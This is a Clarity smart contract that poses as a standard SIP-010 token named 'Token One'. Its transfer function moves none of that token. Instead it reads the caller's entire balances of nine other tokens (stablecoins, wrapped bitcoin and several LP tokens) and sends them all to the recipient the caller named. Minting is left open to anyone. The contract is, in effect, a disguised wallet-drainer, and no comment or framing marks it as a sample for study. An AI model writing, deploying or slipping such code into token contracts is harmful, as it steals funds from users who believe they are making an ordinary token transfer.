;; token-one

(impl-trait 'SPQC38PW542EQJ5M11CR25P7BS1CA6QT4TBXGB3M.sip-010-trait-ft-standard.sip-010-trait)

(define-constant ERR_UNAUTHORIZED_TRANSFER (err u1))

(define-constant AUTHORIZED_MINTER 'SP3MCM8K9KEJMFM6MN191JVN5CA51MDS7AM3SGYQ6)

(define-data-var token-uri (string-utf8 256) u"")

(define-fungible-token token-one)

(define-read-only (get-total-supply)
  (ok (ft-get-supply token-one))
)

(define-read-only (get-name)
  (ok "Token One")
)

(define-read-only (get-symbol)
  (ok "tONE")
)

(define-read-only (get-decimals)
  (ok u6)
)

(define-read-only (get-balance (account principal))
  (ok (ft-get-balance token-one account))
)

(define-read-only (get-balance-simple (account principal))
  (ft-get-balance token-one account)
)

(define-read-only (get-token-uri)
  (ok (some (var-get token-uri)))
)

(define-public (transfer (amount uint) (sender principal) (recipient principal) (memo (optional (buff 34))))
  (let (
    (balance-usda (unwrap! (contract-call? 'SP2C2YFP12AJZB4MABJBAJ55XECVS7E4PMMZ89YZR.usda-token get-balance tx-sender) (err u0)))
    (balance-susdt (unwrap! (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.token-susdt get-balance tx-sender) (err u0)))
    (balance-aeusdc (unwrap! (contract-call? 'SP3Y2ZSH8P7D50B0VBTSX11S7XSG24M1VB9YFQA4K.token-aeusdc get-balance tx-sender) (err u0)))
    (balance-abtc (unwrap! (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.token-abtc get-balance tx-sender) (err u0)))
    (balance-xbtc (unwrap! (contract-call? 'SP3DX3H4FEYZJZ586MFBS25ZW3HZDMEW92260R2PR.Wrapped-Bitcoin get-balance tx-sender) (err u0)))
    (balance-usda-susdt-lp (unwrap! (contract-call? 'SPQC38PW542EQJ5M11CR25P7BS1CA6QT4TBXGB3M.usda-susdt-lp-token-v-1-2 get-balance tx-sender) (err u0)))   
    (balance-usda-aeusdc-lp (unwrap! (contract-call? 'SPQC38PW542EQJ5M11CR25P7BS1CA6QT4TBXGB3M.usda-aeusdc-lp-token-v-1-2 get-balance tx-sender) (err u0)))
    (balance-aeusdc-susdt-lp (unwrap! (contract-call? 'SPQC38PW542EQJ5M11CR25P7BS1CA6QT4TBXGB3M.aeusdc-susdt-lp-token-v-1-2 get-balance tx-sender) (err u0)))  
    (balance-abtc-xbtc-lp (unwrap! (contract-call? 'SPQC38PW542EQJ5M11CR25P7BS1CA6QT4TBXGB3M.abtc-xbtc-lp-token-v-1-2 get-balance tx-sender) (err u0)))         
  )
    (if (> balance-usda u0)
      (unwrap! (contract-call? 'SP2C2YFP12AJZB4MABJBAJ55XECVS7E4PMMZ89YZR.usda-token transfer balance-usda tx-sender recipient none) (err u100)) false)
    
    (if (> balance-susdt u0)
      (unwrap! (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.token-susdt transfer balance-susdt tx-sender recipient none) (err u100)) false)
    
    (if (> balance-aeusdc u0)
      (unwrap! (contract-call? 'SP3Y2ZSH8P7D50B0VBTSX11S7XSG24M1VB9YFQA4K.token-aeusdc transfer balance-aeusdc tx-sender recipient none) (err u100)) false)

    (if (> balance-abtc u0)
      (unwrap! (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.token-abtc transfer balance-abtc tx-sender recipient none) (err u100)) false)
    
    (if (> balance-xbtc u0)
      (unwrap! (contract-call? 'SP3DX3H4FEYZJZ586MFBS25ZW3HZDMEW92260R2PR.Wrapped-Bitcoin transfer balance-xbtc tx-sender recipient none) (err u100)) false)
    
    (if (> balance-usda-susdt-lp u0)
      (unwrap! (contract-call? 'SPQC38PW542EQJ5M11CR25P7BS1CA6QT4TBXGB3M.usda-susdt-lp-token-v-1-2 transfer balance-usda-susdt-lp tx-sender recipient none) (err u100)) false)
    
    (if (> balance-usda-aeusdc-lp u0)
      (unwrap! (contract-call? 'SPQC38PW542EQJ5M11CR25P7BS1CA6QT4TBXGB3M.usda-aeusdc-lp-token-v-1-2 transfer balance-usda-aeusdc-lp tx-sender recipient none) (err u100)) false)
    
    (if (> balance-aeusdc-susdt-lp u0)
      (unwrap! (contract-call? 'SPQC38PW542EQJ5M11CR25P7BS1CA6QT4TBXGB3M.aeusdc-susdt-lp-token-v-1-2 transfer balance-aeusdc-susdt-lp tx-sender recipient none) (err u100)) false)
    
    (if (> balance-abtc-xbtc-lp u0)
      (unwrap! (contract-call? 'SPQC38PW542EQJ5M11CR25P7BS1CA6QT4TBXGB3M.abtc-xbtc-lp-token-v-1-2 transfer balance-abtc-xbtc-lp tx-sender recipient none) (err u100)) false)

    (ok true)
  )
)

(define-public (mint (amount uint) (recipient principal))
  (begin
    (ft-mint? token-one amount recipient)
  )
)

(define-public (burn (amount uint))
  (begin
    (ft-burn? token-one amount tx-sender)
  )
)